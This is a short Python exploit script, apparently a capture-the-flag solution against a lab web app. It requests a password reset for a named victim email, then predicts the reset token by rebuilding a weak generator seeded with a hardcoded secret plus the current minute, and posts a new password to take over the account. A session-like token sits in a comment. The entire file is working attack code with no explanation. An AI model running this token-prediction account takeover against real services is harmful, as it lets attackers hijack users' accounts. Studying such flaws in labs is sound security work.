import string
import random
from datetime import datetime
import requests

#eyJ1c2VyX2lkIjo4MDF9.ZTOITA.Js6nOTqo6xHWOY-_dffQIXKfFv8
victim_mail = "mcalderwood79@storify.com"
secret = "CH5CSTBK6QH6N8J77VNR8KN44RAHXNP2"
url = "http://wcomol2z7qrsm350m73p9p6tqzqwrdzlgrpocyvl-web.cybertalentslabs.com/"


r1 = requests.post(f'{url}forgot_password', data={
    "email":victim_mail
})

if "Check your email for a password reset link." in r1.text:
    print("Reset password for "+victim_mail+" done!")
else:
    print(r1.text)

def generate_reset_token(secret, token_length=32):
    letters_and_digits = string.ascii_uppercase + string.digits

    current_time_minutes = int(datetime.now().timestamp() // 60)
    seed = secret + str(current_time_minutes)

    random.seed(seed)
    reset_token = ''.join(random.choice(letters_and_digits) for _ in range(token_length))

    return reset_token

reset_token = generate_reset_token(secret=secret)

r2 = requests.post(f'{url}reset_password/{reset_token}', {
    "new_password":"12345678910"
})

print(r2.text)
